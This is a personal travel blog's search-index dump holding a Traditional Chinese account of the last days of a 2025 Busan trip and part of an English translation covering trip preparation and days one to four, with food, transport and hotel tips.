抵達西面站到了之後想說直接在地鐵站寄物，其他地方：樂天百貨也能寄放行李。 這邊寄放行李很貴：早上 10:45 寄放，晚上 20:10 取回。 被收了 $6,000 + $7,000 韓元 (約 NT$280)。這站地下街也有一家 Olive Young，再去補貨了一波。11:00 午餐 韓式 刀削麵 — Gijang Sonkalguksu逛完接近中午，到附近的市場吃刀韓式削麵。菜單選擇很單純，就只有刀削麵跟海苔捲。 點了海苔捲分著吃跟我點了刀削冷麵，麵的口感很勁道，冰涼爽口；缺點是沒什麼配料(肉)，純碳水吃起來很單調。吃完之後走回樂天百貨。The Liter Seo-myeon Medical Street Branch再去買了一杯 Liter 藍莓冰沙優格解膩。 這家的阿珠媽很熱情樂天百貨 — 釜山總店 Lotte Dept. Store Busan Main Branch我覺得很難逛，或是說比昨天的樂天百貨-光復店還難逛，樓層少商家少； 唯一優點是樓上有很大的公共休息區，可以充電休息。這裡也有一家釜山紀念品店，但是東西比南浦的少很多。逛完樂高店，不知道要去哪就改坐公車去逛新世界百貨了。 西面另一家 NC百貨已歇業， 其他要逛可能可以去 田浦咖啡街 那邊有很多小店(類似東區的感覺)，但是對男生來說興趣普普。Busan is good! 在釜山到處可以看到「Busan is good」的標語，確實旅遊體驗下來真的不錯，公車超級多、交通方便、公車很新很涼、物價便宜東西好吃。新世界(SHINSEGAE)百貨 — Shinsegae Centum City 👍👍👍前幾天來只去了 Spa Land 沒有逛到，這次來補逛。 新世界百貨超級大(金氏世界紀錄第一大) ，有很多東西可以逛。 逛不夠隔壁也有 樂天百貨 — Lotte Dept. Store Centum City Branch 。由兩棟建築組成，每一棟都有好幾層，每一層的面積也都很大；順手紀錄了一下釜山 La Lebo(在一樓) 的價格。本棟樓頂有 ZOORAJI 免費的恐龍公園可以遛小孩。隨意逛了逛，基本上所有品牌、所有類型的櫃位都有。走到另一棟的 1 樓發現有 Shake Shack 那我還不吃爆：SHAKE SHACK BUSAN CENTUM點了這個有脆脆的雞肉套餐，Shake Shack 除了招牌我覺得雞肉鮮嫩多汁也很好吃。呼叫器好像有點問題，其實早做好了只是沒響。 懷念的好滋味。 遊記: 大阪 Shack Shake / 曼谷 Shake Shack~=17:00 離開新世界百貨~=17:45 回到田浦站(西面)準備晚上吃韓牛。田浦站出來就能看到往田浦咖啡街的指示牌，出來這邊有一家獨棟的 Olive Young。田浦這塊有很多咖啡店、小店，有點像東區的感覺。花肉店 田浦店 — flowerbeefhouse有點東區網美店的感覺，還好有在 CatchTable 提前預約 不然現場沒位子。 點了一份韓牛 Set+炸醬麵+Cass 啤酒，韓牛嫩但沒什麼牛味，我覺得普普；加上 價格實刷 NT$2,458 C/P 值不太高 ，不如前幾天吃的喉嚨鍋蓋烤肉。 優點大概是拍照漂亮、店員親切還會中文。19:15 吃飽走回西面站田浦到西面這邊真的有很多小店、咖啡店、還有看到 ZARA。回西面站後去樂天百貨 B1 美食街買吃的，準備去機場飯店這裏也有超市，最後買了這個章魚燒回飯店吃，選了最右邊的韓式口味。~=20:30 前往機場飯店 這次是反方向往伽倻大學，同樣是週二，彷彿看到上週二剛到釜山的自己。~=21:00 抵達 AIR SKY HOTEL飯店在機場的上一站 — 西釜山流通地区站，對街有 CU/GS25 超商。”) 這間房間跟浴室都是三天最大、設施最齊全的，不過我們也只是住一天的過客。房間窗戶外可以直接看到飛機起降。去超商買了水蜜桃酒配剛剛買的章魚燒，我覺得這個章魚燒很讚，雖然帶回來已經軟掉，但是他是黑色墨魚漿為基底、台灣章魚燒的脆感配上韓式的辣醬，很好吃。😋Day 8 08/05 (二) 釜山金海國際機場、回程時光匆匆，很快的八天的釜山行要畫下句點了，最後一天就只有去機場一個行程。從飯店出來搭一站就到達機場 (約 10 分鐘)。到機場後直接上二樓國際線出發。 早上還在睏，忘了順便去 申請 SES 加速下次入境通關。退稅如果有退稅單要退稅，記得 照這篇文章 去辦理。我的退稅單弄不見了…二樓邊邊有很多自助報到機，直接在這邊按一按報到、劃位；可以看到三樓也很多吃的跟商店。櫃檯被分配到 D 在最邊邊。 釜山航空免費額度只有：15 KG 會檢查隨身攜帶的行動電源有沒有裝在夾鏈袋 掛完行李務必在那一區域等待 5 分鐘，看有沒有問題 那天有人一直被廣播找不到人…~= 09:30 出境候機 出境大廳不大，就一排而已；有幾家免稅店跟一家超商跟咖啡廳，賣少許吃的。(如果很餓記得在外面吃完再出境) 因為是軍民兩用機場所以不能拍外面飛機。不知道要買什麼，去超商買了兩罐 GD 酒帶回台灣。Delay 11:07 起飛，提早 11:58 抵達釜山行大成功！戰利品沒買什麼呢。感謝閱讀 如果您喜歡我的遊記歡迎透過我的推廣連結購買 韓國釜山通行證 VISIT BUSAN PASS 我將獲得部分分潤收益，謝謝。更多遊記 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2024 山陰廣域地區 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 1K+ Followers 230 Total Views Last Statistics Date: 2025-08-15 | 218 Views on Medium." }, { "title": "Travel Diary: 8 Days and 7 Nights in Busan, South Korea 2025", "url": "/posts/z-travel-diaries/en/travel-diary-8-days-and-7-nights-in-busan-south-korea-2025-8ace34a1a3d8/", "categories": "Z Travel Diaries", "tags": "Lifestyle, travel, busan, korea, travel-writing", "date": "2025-08-13 12:38:54 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 8 Days and 7 Nights in Busan, South Korea 2025From south to north, us...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 8 Days and 7 Nights in Busan, South Korea 2025From south to north, using the VISIT BUSAN PASS, explore beautiful sights and taste delicious food, starting your unique journey in Busan.Gwangandaegyo BridgeBackgroundLast year, during 2024’s “Second Visit to Kyushu: 9-Day Free Trip, Entering via Busan → Hakata Cruise”, I entered South Korea through Busan and then took a ferry to Fukuoka, Japan. I only spent a brief morning in Busan, just visiting Haedong Yonggungsa Temple and Haeundae Beach. This year, with some work breaks in July and August, I decided to explore Busan more deeply, accompanied by my colleague Sean from Pinkoi, who is also free.Dates: 2025/07/29–08/05TL;DRHere’s a summary upfront: “Although Busan doesn’t have the tranquility and order of Japan, it offers spontaneity and warmth.”Must-Visit Attractions: [North] Skyline Luge [North] Yacht Tour Y Holic [North] Sky Capsule Train [North] Jjimjilbang [North] Haedong Yonggungsa Temple [North] Shinsegae Department Store [South] Yeongdo BridgeMust-Try Foods: [North] Grilled Eel — PUNGCHEONMAN [North] Salt Bread — Jayeondo Saltbread [South] Throat Pot Lid Grilled Meat — Moggumung Nampo Branch [South] Milgot Red Bean Cream Mugwort Rice CakeEssentials: VISIT BUSAN PASS (A must-use, can save a lot of money) VISIT BUSAN PASS (A must-use, can save a lot of money) VISIT BUSAN PASS (A must-use, can save a lot of money) Things I missed this time: Seafood Pancake (missed), Pork Soup Rice ( had it last time ), Live Octopus (I don’t eat raw, saw many people getting food poisoning on IG), Soy Sauce Crab (I don’t eat raw)Pre-Trip PreparationsFlightsBusan Air ( Includes 15KG checked baggage ).Price: NT$6,728 / person. Departure: 07/29 (Tue) Taipei Taoyuan (TPE) 16:25 → Busan Gimhae (PUS) 19:55 Return: 08/05 (Tue) Busan Gimhae (PUS) 10:50 → Taipei Taoyuan (TPE) 12:35Total days: 8 days, actual days: 6 days (the first and last days are basically just for flying).Transportation CardKKday Physical Transportation CardThis year, my iPhone can directly use the Tmoney card in Apple Wallet, which is very convenient for recharging; however, I already recharged the physical card I bought last year, so I didn’t use it.Additionally, starting this year, you can also recharge your transportation card directly through the Wowpass App. The process involves first recharging Wowpass with a credit card and then transferring funds from Wowpass to Tmoney, which is a bit more complicated and incurs a service fee. Regardless of which method you choose, it’s recommended to recharge in Taiwan using a credit card (as it may only support certain issuing institutions) or bring some cash to Korea to recharge at the machines. Naver Map Be sure to use Naver Map in Korea. _Be sure to use Naver Map in Korea._ _Be sure to use Naver Map in Korea._Bus Regulations Korean bus regulations prohibit bringing luggage larger than 20 inches and handheld drinks on board (even if you’re just holding it and not drinking, they will stop you) Additionally, stores do not accept outside trash, so if you have your own iced drink, it’s best to finish it at the attraction or department store before leaving, otherwise it can be troublesome. For two or more people, it’s actually more convenient to take a taxi, as there are many taxis in Busan that are cheap, new, and convenient. Please confirm the direction before entering the subway station.VISIT BUSAN PASSThe Busan Pass comes in time-limited (24/48 HR) unlimited types and limited-use types (to be used within 180 days).KKday 2025/08 Busan Pass Information Since our itinerary is spread out over these 8 days and the attractions we want to visit are limited, we chose to buy two BIG5 passes. Price: NT$1,380 * 2 = NT$2,760 The electronic version can be used by directly showing the order QR code.Actual usage situation is as follows:KKday 2025/08 Busan Pass Information Blue indicates one less use (didn’t go to Taejongdae) Rode the Haeundae Coastal Train once each day for two days.Yacht Tour Y Holic Reservation⚠️To take the yacht tour using the Busan Pass, you need to make a reservation with the boat owner. We chose Y Holic as an example.After purchasing the pass, contact the boat owner through the following channels:IG: @yachtholic_info (we used Line)LINE: @yachtholicEmail: yh@yachtholic.comWeChat: yachtholicInform them of the number of people, date, time slot, contact information, and the QR code of the Busan Pass.Wait for confirmation; if there are no issues, your reservation is successful! The night session (starting at 18:00) requires an additional 5,000 KRW per person, which can be paid on-site or transferred in advance. You need to arrive 30 minutes early to queue for identity verification. We scheduled to watch the sunset at 18:30. If you don’t want to buy the pass, you can also directly reserve the yacht tour.Busan, South Korea | Haeundae Blue Line Park Coastal Train &amp; Sky Capsule Train TicketsPlease note: The coastal train and the capsule train are different; do not buy the wrong one. The beautiful capsule train is not included in the Busan Pass and requires a separate ticket purchase; it is very popular, so be sure to book in advance before departure. The Sky Capsule departs from Oryukdo. 2-person seating (1 ticket for 2 people) Price: NT$861Korea Network Card | South Korea High-Speed Unlimited Data eSIM 7-day unlimited data plan (I didn’t buy it since I was going to the airport on the last morning)Naver Map Be sure to use Naver Map in Korea. _Be sure to use Naver Map in Korea._ _Be sure to use Naver Map in Korea._Interlude — The day before departure, I found my Naver Map account lockedhttps://help.naver.com/service/5640/contents/20783?lang=en&amp;osType=COMMONOSThe reason seems to be that logging in from Taiwan was considered suspicious activity, triggering Naver’s account protection mechanism.You can reactivate your account through identity verification, but I’m not sure if it was because I forgot what name I filled in or if foreigners can’t pass the real-name verification. Regardless of what I entered, it always showed that the input information was incorrect, and in the end, my account was completely locked.I found online information stating that you can fill out a form to request the lifting of the protection measures: “ Members residing outside of Korea_Request to lift account protection measures “, but I wasn’t very sure about the name issue, so my first application was rejected:Appeal FailedIn my second attempt, I went directly to the Help Center to fill out the application form:The content of my appeal included:1. Your NAVER ID.If you forget your account, you can retrieve it via email or phone.2. The registered name, date of birth, and contact information (mobile phone number or email address) of your NAVER ID.Date of birth: YYYY/MM/DD (the birthday you registered)Mobile Number: +886XXXXXXXXX (the phone number you registered)Email: (the email you registered)Registered Name: Sorry I really forget which name I've input, it may be one of down below:The name combinations you can think ofXXXXX LILI XXXXXXXX李XXbut my real first name is XXXX, last name is Li3. Attach your overseas identification card.as attached file.4. The details of your request to the NAVER Help Center.I forgot my name which I input and I want to lift the account protection measures.The more information you can provide, the better. I attached a file with a picture of my passport’s personal information page.And then I successfully unlocked it:I received a temporary password email, and I could log in to Naver Map with the temporary password. Remember to change your password and enable two-factor authentication for login (since we canceled Naver’s login protection mechanism). Naver’s response speed is quite fast, resolving everything within half a day; if you’re worried about being locked out unexpectedly, you can apply for “ Members residing outside of Korea_Request to lift account protection measures “ ( Refer to this article for filling out the form ).FoodThe only reservation made in advance was for the Korean beef barbecue at Hwa Meat Restaurant, Tianshan Branch.CatchTableThe platform Catchtable is quite convenient for making reservations at Korean restaurants in advance.Fun Day 1 07/29 (Tue): Arrive in Busan, head straight to Haeundae Hotel Day 2 07/30 (Wed): Morning Skyline Luge, Haedong Yonggungsa Temple, afternoon Coastal Train + Capsule Train, return to Haeundae, Busan BUSAN X the SKY, dinner at Weizhan Wang BBQ Day 3 07/31 (Thu): Morning Cheongsapo, honey butter toast, return to Haeundae on Coastal Train, afternoon Spa Land, evening Busan Yacht Tour, dinner at grilled eel Day 4 08/01 (Fri): Move to Nampo-dong, Songdo Cable Car, Yonggung Cloud Bridge, Gamcheon Culture Village, dinner at Throat Pot Lid Grilled Meat, night view from Busan Tower Day 5 08/02 (Sat): Lotte Department Store, Yeongdo Bridge opening (only on Saturdays). Day 6 08/03 (Sun): Lotte Department Store, Bupyeong Canned Food Market, Baekjeongwan Culture Village, night view from Beomeosa Temple. Day 7 08/04 (Mon): Move to Seomyeon, dinner at Korean beef. Day 8 08/05 (Tue): Busan Gimhae International Airport, return trip.AccommodationHaeundae Benikea Good Night Hotel (Day 1 — Day 4 Three Nights)The location is quite convenient, about a 10-minute walk to Haeundae Street. The room has windows but no sea view, and it’s a twin room. Price: Actual charge NT$12,032, approximately NT$2,000 per person per night.Hotel Noah (Day 4 — Day 7 Three Nights)It’s about a 5-minute walk from Jagalchi Station, and right across the street is BIFF Square. The room has windows and is a twin room. Price: Actual charge NT$7,783, approximately NT$1,298 per person per night.Air Sky Hotel (Day 7 — Day 8 One Night)It’s only one stop from the airport, and the total time for waiting, riding, and walking is about 10 minutes to the airport. The room has windows and is a twin room. Price: Actual charge NT$2,835, approximately NT$1,418 per person per night. As a side note: This hotel will send a canned message requesting a deposit after booking is completed. If you have already paid in full at that time, you can ignore it.VisaNo visa is required for South Korea; just fill out the online entry application form three days before departure, and you can complete entry directly with your passport upon arrival. Ready to go, let’s depart!Day 1 07/29 (Tue) Taiwan to Haeundae~=13:30 Arrive at Taoyuan International Airport Terminal 2Check-in starts around 13:50, and it takes about until 14:10 to complete check-in and baggage drop. You can complete check-in and seat selection online on the Busan Airlines website (free) in advance.14:30 Complete departure and grab a biteSince we need to rush to the hotel after landing in Busan, we eat a hearty meal in Taiwan first.15:00 Start waiting at the gate and activate eSIMWorried about poor airport internet, so I activate the eSIM in Taiwan in advance.~=16:40 Flight departsThe flight is delayed by 15 minutes, and the seats are quite small.~=20:05 Arrive in Busan, South Korea Busan Airport is a military-civilian dual-use airport, and photography is prohibited.~=20:30 Collect luggage and complete entryFirst, I go to the airport convenience store to buy some snacks for energy, exchange money, and take a break.~=21:00 Arrive at Gimhae Light Rail — Airport StationIt’s about a 5-minute walk from the airport.I first help Sean recharge his transportation card. There are two machines for recharging transportation cards (Self Service Charger), only multiples of 1,000 won can be added.After swiping the card to enter, please find the platform for Sasang Station; the next stop is “West Busan Distribution Area.”~=21:15 Arrive at Sasang to transfer to the Green LineJust follow the green signs on the ground to transfer from the light rail to the subway Green Line, heading towards “Changsan” (the other direction is towards “Yangsan,” so don’t mix them up), with the next stop being “Gamdang.”~=21:20 Arrive at Green Line Sasang Station and wait for the train~=22:20 Arrive at HaeundaeWhen approaching Haeundae Station, the subway announcement will have seagull sounds.~=22:30 Arrive at the hotel~=22:50 Go out to Haeundae Street for foodThe area where we are staying passes through the Haeundae Traditional Market, which sells a lot of food.~=23:30 Return to the hotel to eatIn the end, we bought BBQ fried chicken in two flavors, spicy rice cakes from the traditional market, and some alcohol from the convenience store. One order of fried chicken is enough for two people; two orders are too much (feels like four orders in Taiwan), actual charge NT$1,210. This mango wine (Iced tea highball with mango cubes) is delicious (5%), with canned mango pieces inside. I later found out that it’s also available at FamilyMart in Taiwan.Day 2 07/30 (Wed) Skyline Luge, Haedong Yonggungsa Temple, Coastal Train, Capsule Train, Busan BUSAN X the SKY, Weizhan Wang BBQ09:30 Depart — Super nice weatherThere is a bus directly to Skyline Luge right in front of the hotel.10:25 Skyline Luge 👍👍👍Around 10:30, we start queuing to exchange tickets (the Busan Pass needs to be exchanged before use). There are quite a few people, and we waited about 20 minutes to get the tickets; the Busan Pass allows you to choose to ride the luge twice or once on the luge and once on the zip line. Almost everyone chooses to ride the luge twice. If you haven’t bought the Pass, you can also purchase tickets on KKday. (cheaper than buying on-site, but you still need to exchange tickets to enter)After exchanging tickets, we go to choose the right size helmet, and once we put on the helmet, we can take the cable car up.~=11:00 Get on the cable carMost people are concentrated at the ticket exchange and ticket purchase counters, and there is hardly any queue for the cable car and luge. During the cable car ride, you can see the track below, and it takes about 5 minutes to reach the starting point.If you’re afraid of open cable cars, I noticed another box-type cable car nearby that seems to be opening soon(?).11:05 Get ready to startFrom the top, you can see the nearby Lotte World.For first-time riders, there will be a staff member to give a brief tutorial and stamp your hand.The operation instructions are as follows: Keep your legs straight Move forward to accelerate, pull back to brake You cannot stop midway, you cannot stop midway, you cannot stop midway; if you come to a complete stop, it will be very difficult to continue sliding. Slow down before turning; otherwise, you might flip over. Be careful when overtaking. Control with both hands; do not hold your phone. There will be cameras along the way that take photos, which you can buy at the souvenir shop. Be careful not to drop personal belongings.It takes about 6 minutes to slide from the top to the bottom.At the bottom, there is a souvenir center where you can buy photos taken along the way.After passing through the souvenir center, we return to the entrance and queue again for the cable car to go up.This time we enter through the re-entry passage (you can play directly without staff instruction).He wins.11:45 Leave and head to Haedong Yonggungsa TempleAfter exiting Skyline Luge, walk straight across to Haedong Yonggungsa Temple, which takes about 10 minutes uphill.11:55 Haedong Yonggungsa TempleSince I visited last year, this time I just take a quick look.Around 11:55, we reach the entrance of the vendors at Haedong Yonggungsa Temple.This time I discovered that there is also a path to the right of the entrance plaque, which is a gentle slope leading directly to the main hall; the path through the plaque entrance has steep stairs, which are difficult to walk.12:45 Wait for the bus to Songjeong StationBusan has done a good job with summer heat measures; there are umbrellas at traffic lights, and almost every bus stop has fans that you can press to activate.The route plan is as follows:From Skyline Luge, take the bus + walk to the Coastal Train Songjeong Station, take the Coastal Train to Cheongsapo Station, and then transfer to the Capsule Train back to Haeundae.~=13:15 Arrive at Songjeong StationIt takes about 10 minutes to walk from the bus stop, and it’s very hot and sunny.refThe 13:30 train is full, so we booked for 14:00. ( Schedule ) A little side note: The station staff did not allow us to use the Busan Pass PDF file; they insisted we show the certificate from the KKday App. The tickets exchanged for the Busan Pass can be used on the same day, and you can board once at each station, so you can actually stop at various attractions along the way.It’s still early, so I decided to grab a bite at a convenience store; right outside Songjeong Station is Songjeong Beach (it seems less crowded here), and there’s a convenience store nearby.~=13:40 Waiting for the BusRemember to line up early, or you’ll end up standing at the back of the line.After passing through the station, I walked all the way to the platform, where I could validate my ticket and start waiting for the bus.The bus is expected to arrive around 13:50, and the crowd began to stir and line up.~=14:00 DepartureI sat in the second row, and the view was quite nice.~=14:15 Arriving at CheongsapoAfter getting off, I saw the stairs to the second floor, which is where the capsule train boarding area is located.I opened the KKday order confirmation link to find my ticket confirmation; after going up to the second floor, I showed the confirmation to the staff at the booth (we had reserved the 14:30–15:00 time slot), and they gave me a number tag. When the time comes, they will start calling numbers, and if they have already started, you’ll just have to wait until they finish.While waiting, I went to the souvenir shop next door and bought a fan. The capsule train also provides free fans (as seen in the rightmost image).~=14:30 Capsule Train BoardingWhen the time comes, the staff will start calling numbers for boarding.There is air conditioning above the waiting area, and your ticket will be validated before boarding (make sure to have it ready). Once on board, the staff will take a group photo, and then you can decide if you want to buy it after getting off.~=14:40 Capsule Train from Cheongsapo to Oryukdo (Haeundae) Departure! 👍👍👍It looks thrilling, but it actually moves quite slowly; there’s no air conditioning in the carriage, but there are ventilation fans and a speaker where you can plug in your phone to play music.I enjoyed the scenery and took some Instagram-worthy photos (maybe?).~=15:10 Arriving at Oryukdo (Haeundae)Walking towards Haeundae (the tall buildings), I reached the intersection where on the right is the famous and delicious Salt Bread — Jayeondo saltbread (I’ll come back to buy it later), and on the left, I walked down to the entrance facing the sea, which is the entry point for Busan Sky.~=15:35 Busan BUSAN X the SKYThe glass facing Haeundae Beach has barriers, so you can’t get too close for photos.There’s a transparent glass floor bridge, but the glass is quite worn, so the effect is mediocre; there’s also a transparent glass restroom.Walking down to the café and souvenir shop, I could look back at the route the capsule train took.I had a fish cake sausage to replenish my energy (the taste was average).Besides the café and souvenir shop, there are also free exhibitions on this floor.~=16:00 Leaving to buy Salt Bread — Jayeondo saltbread 👍👍👍A portion consists of 6 pieces, so I bought one to share at the hotel. They are fragrant, crispy, and slightly salty, which I found very delicious.There are many large construction projects going on in Haeundae, seemingly preparing for the 2030 World Expo (though it has already failed). I returned to the hotel to rest for a bit and planned to go out for dinner at Matchandeul later.17:50 Arriving at Matchandeul Salted Grill Haeundae BranchThere’s a machine at the entrance to check in, and you’ll receive a notification via email. I arrived at 17:50 and started to queue a bit.You can check the current number by pressing a button, and you’ll receive a notification when it’s your turn to enter, which is very convenient; also, be careful as the buildings across and next door are under construction.18:25 Entering for DinnerI waited for about 30 minutes before entering.We ordered a couple’s set (which includes one type of meat each + a large soybean paste soup + rice) and a bottle of Cass beer, totaling around NT$1,500. They will grill it for you; reviews say the meat is delicious but the portions are small, and you have to wait in line.~=20:30 Full and Back to Haeundae StreetI strolled along Haeundae Street to digest and bought ice cream from a matcha specialty store for dessert.Next door is the newly opened Olive Young Delight Project store, where I did some shopping; they had many buy-two-get-one-free offers, and you can get an immediate tax refund if you spend over 15,000 won.I took a quick walk on Haeundae Beach before heading back to the hotel to rest.Day 3 07/31 (Thursday) Cheongsapo, Spa Land, Coastal Train, Busan Yacht TourSince I only transferred at Cheongsapo yesterday without exploring, I came back today.11:00 Taking the Bus to CheongsapoThe bus from Haeundae to Cheongsapo is a minibus, and the route goes through smaller, steeper community roads like Busan Mountain Villa.11:30 Arriving at CheongsapoI randomly found a place to eat nearby for lunch (Gohyang katsu), and I ordered a pork cutlet sandwich; the meat was thick, tender, and reasonably priced.~=12:30 DIART COFFEE Honey Butter ToastAfter lunch, I stepped outside to find the highly recommended Busan Honey Butter Toast at DIART COFFEE, ordered one (₩10,000) and a coffee (₩5,500) to take a break.For how to eat it, you can refer to this card; basically, you cut the bread into pieces and evenly spread butter and honey on it before eating. The honey isn’t too sweet, combined with the buttery flavor and crispy bread, it’s delicious without being overwhelming.~=13:30 Back to Cheongsapo to Prepare for the Coastal Train Back to Oryukdo (Haeundae)The ticket from yesterday was no longer valid, so I exchanged another ticket for the coastal train using the Busan Pass; here, I could only stand at the back of the train.The train passes by several scenic platforms, but it was too hot, so I didn’t get off.~=13:55 Arriving at Oryukdo (Haeundae)After returning to Haeundae, I walked and took a bus to Shinsegae Spa Land.~=14:30 Arriving at Shinsegae Department StoreI didn’t browse around and headed straight to the first floor Spa Land.14:40 Spa LandI exchanged my Busan Pass for entry to Spa Land. You can also purchase tickets in advance on Kkday if you didn’t buy the Pass.Upon entering, I received a wristband for access to lockers for shoes and clothes, and I changed into special clothes for the sauna. You can also go to the sauna (nude) first before heading to the sweat room, which is located near the women’s changing room.The first floor has a sunbathing area, nail salon, snack stalls, and various types of sweat rooms (it was so crowded during summer that almost every room was full), while the third floor has restaurants (where you can eat grilled eggs and instant noodles), massages, massage chairs, and a yoga room.After the sauna, I went to the sunbathing area to relax and soak up some sun while ordering a drink (which was super sweet). All expenses within the facility are charged to the wristband, and you settle the bill upon exiting. Honestly, I didn’t get to experience the sweat room at all this time; it was too crowded. I’ll have to try again next time.17:00 Preparing to Head to the Yacht DockI had a reservation for the 18:30 session, so I needed to arrive early for check-in.Before departing, I bought some snacks at Shinsegae Department Store B1 to fill my stomach.Taking the Subway to Dongbaek StationAfter exiting the station, it’s about a 15-minute walk to the dock. There are only vending machines and dirty restrooms at the dock, and it gets crowded, so you have to wait in line; it’s recommended to buy what you need in the city and use the restroom before coming here.~=18:00 Arriving at the Yacht DockAfter passing through the visitor center, I arrived at the dock’s meeting area, where different boat operators have their own boarding points.Around 18:15, the boat operators finally showed up to start checking in and collecting the nighttime surcharge (₩5,000 per person).18:30 Yacht Departure 👍👍When boarding the boat, you need to wear a life jacket and sit in the front row on the second level.The boat moves slowly and won’t rock too much as it heads towards the Gwang-an Bridge. However, if you’re prone to seasickness, it’s still recommended to take seasickness medication.General Route Map:~=18:50 Arrive at Gwang-an BeachAbout 20 minutes later, we will arrive at the waters in front of Gwang-an Beach, where you can see many tourists playing SUP; we will stop here to set off fireworks. The fireworks will be set off by the crew members of the various yachts departing at this time, but it’s still quite cool, so they might not be very visible.Along the way, the staff will also enthusiastically help take photos.~=19:00 Return TripWe just happened to see the evening glow.~=19:20 Back on LandAfter returning to land, we took the bus back to Haeundae.~=19:35 Arrive at HaeundaeHaeundae Beach has a market and food trucks.~=19:55 Dinner at Haeundae Grilled Eel — PUNGCHEONMAN 👍👍There are plenty of seats inside, so no need to wait in line; we just walked in.We ordered grilled eel + grilled beef slices + two cold noodles + beer, totaling NT$2,387.The grilled eel is crispy, tender, and juicy, very delicious, with no fishy taste at all; the grilled beef slices are okay but average; the buckwheat cold noodles are reminiscent of some brown sugar ice, but they actually have a soy sauce flavor with crushed ice, making them refreshing and tasty.After eating, we strolled around Haeundae Street, visited the Haeundae Traditional Market (forgot to eat seafood pancakes, darn it!), and bought some souvenirs; we will be leaving Haeundae tomorrow.Day 4 08/01 (Fri) Nampo-dong, Songdo Cable Car, Yonggungsa Bridge, Gamcheon Culture Village, Busan Tower09:15 Depart for Nampo-dongEarly in the morning, we prepared to leave Haeundae for Nampo-dong.~=10:30 Arrive at Jagalchi Station, Hotel Noah hotelDrop off our luggage.BIFF SquareRight across from the hotel is BIFF Square, which is very lively and convenient.~=11:00 Lunch — Hongkong 0410 Nampo 1st BranchAround noon, we casually found a restaurant in BIFF for lunch; this one serves Korean-style Chinese cuisine.We ordered fried dumplings, sweet and sour pork (medium, felt we could have ordered a smaller size), and Korean-style jajangmyeon.The fried dumplings were a bit greasy, but the sweet and sour pork was good.12:15 Take the bus + walk to Songdo Cable Car StationAfter getting off the bus, we still had to walk about 10 minutes. It was too hot, so we stopped by a convenience store to grab a homemade iced coffee latte to cool off.Once inside, we exchanged our Busan Pass for cable car tickets (the Pass is for the crystal cabin, round trip, so keep the ticket safe).After receiving the tickets, we took the escalator upstairs to queue for the cable car. (They offered lollipops, but I didn’t take one.)12:25 Board the Cable Car5–6 people per cabin.~=12:35 Arrive at SongdoUpon exiting, turn right and walk down.Walk down the stairs, turn right at the end, and you will reach the “Songdo Yonggung Bridge.”~=12:40 Arrive at Songdo Yonggung BridgeThe ticket office next to it allows you to exchange your Busan Pass for entry.There is no shade here at all, and under the blazing sun, you can overlook the entire Songdo cable car.~=13:00 Return to Songdo Cable Car, queue to go back~=13:25 Leave Songdo and walk back to catch the busThere is also a viewing platform here at the cable car station, but it was too hot, so I didn’t go.We walked back to the bus station to return to the city and then transferred to a minibus to Gamcheon Culture Village.~=14:20 Gamcheon Culture VillageWe didn’t take photos, just explored; it felt like a rainbow community with some cafes. We walked down casually until we reached another bus stop to take the bus back to the hotel. The buses here are minibuses, somewhat like the ones going up Yangmingshan, the drivers drive quite aggressively, and it’s very crowded.~=15:00 Return to Noah Hotel for a restHotel Noah View from the room window I initially thought there was no coin-operated washing machine, but it turns out there is a free washing machine available in the restroom on the third floor.~=17:40 Depart for dinnerIt takes about 10 minutes to walk from the hotel.~=17:50 Throat Pot Lid BBQ — Moggumung Nampo Branch 👍👍👍 The specialty is that the grill is a pot lid. The side dish includes a vitamin C (I checked, and taking vitamin C before or after BBQ can reduce free radical production and lower cancer risk). You must order at least three servings of meat, and the staff will grill it for you. We ordered two servings of pork + one serving of beef + two bowls of instant noodles + Cass beer, with each meat serving costing 18,000 KRW, totaling NT$1,060, which is quite a bargain, and the meat is delicious!! Highly recommended.~=18:30 Walk to Busan TowerAfter eating, we walked to Busan Tower to digest, which took about 20 minutes.The way there was lively, with many restaurants. Actually, the navigation should be set to — Yongdusan Media Park Entrance, as there is an escalator going up from there; walking from here requires a bit of a climb (about 5 minutes).19:00 Arrive at Busan Tower, wait for sunset before going up to see the night viewIn the meantime, we browsed the souvenir shop.19:30 Go up Busan TowerShow the Busan Pass at the counter on the first floor to exchange for tickets.At Busan Tower, you can scan your ticket to play a puzzle game; solving all the codes will earn you a small prize. (I have written the codes down later.)By the time we got up, there were already many people waiting.19:45’s Busan sunset.At 20:00/20:10… there was a light sculpture projection fireworks show, which was average.20:00 Busan Night View~=20:10 Leave the towerBefore leaving, there are still many spots to take photos.~=20:15 Exchange for a small souvenirBefore heading down, remember to go to the unmanned ticket booth (Ticket Box) machine: Enter the code: 19731121 (the date Busan Tower was built) You can then take the voucher to the blue souvenir center outside (not the one on the first floor of Busan Tower) to exchange for a small prize.The small souvenir is a card with various designs to choose from; I chose a transparent Busan Tower:We walked down from Yongdusan Park. There are escalators here!! (Going up, but there are none going down, and some parts are under renovation)20:30 Return to — Yongdusan Media Park EntranceRemember, it’s closer to go to Busan Tower from here.We wandered around the shopping street, where there is an HBAF almond store, probably the place with the most flavors; I bought a Yellow combo pack (which contains small bags) along with some other special flavors (popping candy, which really pops, spicy stir-fried rice cakes) and popular flavors (honey, Oreo, corn) to take home as souvenirs.20:45 Return to BIFF Square for a late-night snackThere are many vendors here, and the floor has handprints of celebrities.Makgeolli, BHC Fried Chicken — BHC Chicken Busan Nampo Branch (right at BIFF Square) 👍👍In the end, I bought some food to take back: Makgeolli: Similar to millet wine or fermented rice, it’s really great. BHC Boneless Fried Chicken: The seasoning and chicken are both tender and delicious.00:00 Goodnight NampoAround 00:00, the vendors had all cleared out.Day 5 08/02 